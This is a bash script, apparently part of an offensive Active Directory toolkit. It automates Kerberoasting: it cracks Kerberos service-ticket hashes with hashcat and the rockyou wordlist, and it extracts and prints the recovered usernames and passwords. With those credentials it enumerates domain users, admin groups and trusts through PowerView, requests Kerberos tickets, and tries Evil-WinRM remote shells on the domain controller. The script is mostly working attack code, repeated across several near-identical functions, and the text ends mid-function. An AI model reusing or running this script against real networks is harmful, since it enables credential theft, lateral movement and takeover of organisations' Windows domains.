#!/bin/bash
########################################
####  [+]-- Author: 0x2034   --[+]  ####
####   [+]--   CyberThug    --[+]   ####
########################################

echo -e "\e[1;32m
              ______      __             ________
             / ____/_  __/ /_  ___  ____/_  __/ /_  __  __._____
            / /   / / / / __ \/ _ \/ ___// / / __ \/ / / / __  / 
           / /___/ /_/ / /_/ /  __/ /   / / / / / / /_/ / /_/ /  
           \____/\__, /_.___/\___/_/   /_/ /_/ /_/\__,_/\__, /  
                /____/                                 /____/    
                                                            \e[0m""\e[1;38m0x2034\e[0m"

getuserspns1_check1(){
      cat << 'EOF' >> /tmp/auto7.sh
         getuserspns1_check(){
            gnome-terminal -- bash -c "
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
export Kerberos='__$Kerberos__'

i=\$(cat /tmp/.current_iii.txt)
HASH_FILE=\"/tmp/.getuserspn-req11.txt.\$i\"

WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
echo ''
while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \$HASH_FILE \$WORDLIST
echo ''

cracked=\$(hashcat -m 13100 --show \$HASH_FILE)

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | grep -v 'Separator' | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
        cat << EOT > /tmp/spn_req1.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOT
        chmod +x /tmp/spn_req1.sh
        bash /tmp/spn_req1.sh
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c '
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
user=\"'\$user'\"
p=\"'\$p'\"

echo -e \"\e[1;32m[+] User: \$user\e[0m\"
echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"

echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
echo \"\"
echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
echo \"\"  
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
    echo \"\"
    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
    echo \"\"

    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo \"\"

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
        echo \"\"
        echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
        echo \"\"  
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 0 ]; then
            echo \"\"
            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
            echo \"\"
        fi
    else
        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
        echo \"\"
    fi
fi
exec bash'
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"

}
EOF

}
getuserspns1_check(){
      gnome-terminal -- bash -c "
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
export Kerberos='$Kerberos'

ii=\$(cat /tmp/.current_ii.txt)
HASH_FILE=\"/tmp/.getuserspn-req.txt.\$ii\"
WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
echo ''
while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \$HASH_FILE \$WORDLIST
echo ''

cracked=\$(hashcat -m 13100 --show \$HASH_FILE)

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | grep -v 'Separator unmatched' | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
        cat << EOF > /tmp/spn_req.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOF
        chmod +x /tmp/spn_req.sh
        bash /tmp/spn_req.sh
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c '
export DC=\"'$DC'\"
export CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
export Ip=\"'$Ip'\"
user=\"'\$user'\"
p=\"'\$p'\"

echo -e \"\e[1;32m[+] User: \$user\e[0m\"
echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"

echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
echo ''
echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
echo ''
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
    echo \"\"
    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
    echo \"\"

    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo \"\"

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
        echo \"\"
        echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
        echo ''   
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 0 ]; then
            echo \"\"
            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
            echo \"\"
        fi
    else
        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
        echo \"\"
    fi
fi
exec bash'
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"
}
getuserspns_check1(){
      cat << 'EOF' >> /tmp/auto5.sh
         getuserspns_check(){
            gnome-terminal -- bash -c "
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
export Kerberos='__$Kerberos__'

i=\$(cat /tmp/.current_i.txt)
HASH_FILE=\"/tmp/.getuserspn1.txt.\$i\"

WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
echo ''
while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \$HASH_FILE \$WORDLIST
echo ''

cracked=\$(hashcat -m 13100 --show \$HASH_FILE)

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | grep -v 'Separator' | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
 	cat << EOT > /tmp/temp5.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOT
        chmod +x /tmp/temp5.sh
        bash /tmp/temp5.sh
  	gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;33m[!] powerview failed for \$user again with ticket\e[0m'
exec bash\"  
        gnome-terminal -- bash -c '
export DC='__$DC__'
export CLEAN_DOMAIN='__$CLEAN_DOMAIN__'
export Ip='__$Ip__'
user=\"'\$user'\"
p=\"'\$p'\"

echo -e \"\e[1;32m[+] User: \$user\e[0m\"
echo -e \"\e[1;32m[+] Password: \$p\e[0m\"
echo -e \"\e[1;32m[+] DC: \$DC\e[0m\"
echo -e \"\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m\"
echo -e \"\e[1;32m[+] Ip: \$Ip\e[0m\"

echo -e \"\e[1;32m[+] Trying Evil-WinRM direct auth for \$user ...\e[0m\"
echo \"\"
echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -p \$p --[+]\e[0m\"
echo \"\"  
evil-winrm -i \"\$DC\" -u \"\$user\" -p \"\$p\"

if [ \$? -ne 0 ]; then
    echo \"\"
    echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user. Trying getTGT.py and Kerberos auth ..\e[0m\"
    echo \"\"

    getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
    echo \"\"

    if [ -f \"\${user}.ccache\" ]; then
        export KRB5CCNAME=\$PWD/\${user}.ccache
	echo \"\"
	echo -e \"\e[1;34m[+]-- Running evil-winrm -i \$DC -u \$user -r \$CLEAN_DOMAIN --[+]\e[0m\"
	echo \"\"  
        evil-winrm -i \"\$DC\" -u \"\$user\" -r \"\$CLEAN_DOMAIN\"
        if [ \$? -ne 0 ]; then
            echo \"\"
            echo -e \"\e[1;33m[!] Evil-WinRM failed for \$user again with ticket .. maybe user not in Remote Management Group\e[0m\"
            echo \"\"
        fi
    else
        echo -e \"\e[1;31m[-] getTGT.py failed. No ccache found for \$user.\e[0m\"
        echo \"\"
    fi
fi
exec bash'
    done
else
    echo -e '\e[1;31m[-] No hashes were cracked.\e[0m'
fi

exec bash
"

}
EOF

}
getuserspns_check(){
      gnome-terminal -- bash -c "
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export Ip='$Ip'
export Kerberos='$Kerberos'

i=\$(cat /tmp/.current_i.txt)
HASH_FILE=\"/tmp/.getuserspn1.txt.\$i\"
WORDLIST='/usr/share/wordlists/rockyou.txt'

echo -e '\e[1;32m[+]-- Cracking krb5tgs Hash --[+]\e[0m'
echo ''
while pgrep -x hashcat > /dev/null; do
    echo 'Hashcat is still running, waiting...'
    sleep 10
done
hashcat -m 13100 \$HASH_FILE \$WORDLIST
echo ''

cracked=\$(hashcat -m 13100 --show \$HASH_FILE)

if [ -n \"\$cracked\" ]; then
    echo -e '\e[1;32m[+] Hashes Cracked:\e[0m'
    echo ''
    echo \"\$cracked\"
    echo ''

    echo \"\$cracked\" | grep -v 'Separator unmatched' | while IFS= read -r line; do
        user=\$(echo \"\$line\" | cut -d'\$' -f4 | cut -d'*' -f2)
        p=\$(echo \"\$line\" | rev | cut -d ':' -f 1 | rev)
	cat << EOF > /tmp/temp2.sh
#!/bin/bash

gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r\$CLEAN_DOMAIN\\r\$user\\r\$p\\r\$Ip\\r\$DC\\r\$Kerberos\\r\\\"
interact
\"
EOF
        chmod +x /tmp/temp2.sh
        bash /tmp/temp2.sh
        gnome-terminal -- bash -c \"
export DC='$DC'
export CLEAN_DOMAIN='$CLEAN_DOMAIN'
export user='$user'
export p='$p'

echo -e '\e[1;32m[+] User: \$user\e[0m'
echo -e '\e[1;32m[+] Password: \$p\e[0m'
echo -e '\e[1;32m[+] DC: \$DC\e[0m'
echo -e '\e[1;32m[+] Domain: \$CLEAN_DOMAIN\e[0m'
echo -e '\e[1;32m[+] Trying powerview direct auth for \$user ...\e[0m'
echo ''
echo -e '\e[1;32m[+]-- Running powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Properties name,member\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroupMember -Identity \\\\\\\\\\\\\\\"Domain Admins\\\\\\\\\\\\\\\"\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup -AdminCount\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainTrust\\\\\\\\r\\\\\\\";
interact\\\"
echo ''
echo -e '\e[1;32m[+] Getting TGT for \$user ...\e[0m'
echo ''
getTGT.py \"\$CLEAN_DOMAIN/\$user:\$p\" -dc-ip \"\$Ip\" -k
export KRB5CCNAME=\$PWD/\${user}.ccache
echo ''
echo -e '\e[1;32m[+]-- powerview \$CLEAN_DOMAIN/\$user:\$p@\$DC -k --[+]\e[0m'
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview \\\$CLEAN_DOMAIN/\$user:\$p@\\\$DC -k
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
